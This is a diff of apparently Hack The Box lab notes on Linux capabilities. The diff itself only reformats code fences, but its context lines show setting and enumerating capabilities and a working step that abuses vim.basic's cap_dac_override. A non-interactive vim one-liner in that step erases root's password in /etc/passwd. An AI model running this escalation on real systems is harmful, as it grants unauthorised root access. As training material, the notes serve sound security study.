@@ -16,8 +16,7 @@ For example, we could use the following command to set the `cap_net_bind_service
 
 #### Set Capability
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ sudo setcap cap_net_bind_service=+ep /usr/bin/vim.basic
 ```
 
@@ -66,8 +65,7 @@ It is important to note that these capabilities should be used with caution and 
 
 #### Enumerating Capabilities
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \;
 
 /usr/bin/vim.basic cap_dac_override=eip
@@ -85,8 +83,7 @@ If we gained access to the system with a low-privilege account, then discovered 
 
 #### Exploiting Capabilities
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ getcap /usr/bin/vim.basic
 
 /usr/bin/vim.basic cap_dac_override=eip
@@ -96,8 +93,7 @@ For example, the `/usr/bin/vim.basic` binary is run without special privileges, 
 
 Let us take a look at the `/etc/passwd` file where the user `root` is specified:
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ cat /etc/passwd | head -n1
 
 root:x:0:0:root:/root:/bin/bash
@@ -105,15 +101,13 @@ root:x:0:0:root:/root:/bin/bash
 
 We can use the `cap_dac_override` capability of the `/usr/bin/vim` binary to modify a system file:
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ /usr/bin/vim.basic /etc/passwd
 ```
 
 We also can make these changes in a non-interactive mode:
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ echo -e ':%s/^root:[^:]*:/root::/\nwq!' | /usr/bin/vim.basic -es /etc/passwd
 hiimeins@htb[/htb]$ cat /etc/passwd | head -n1
 
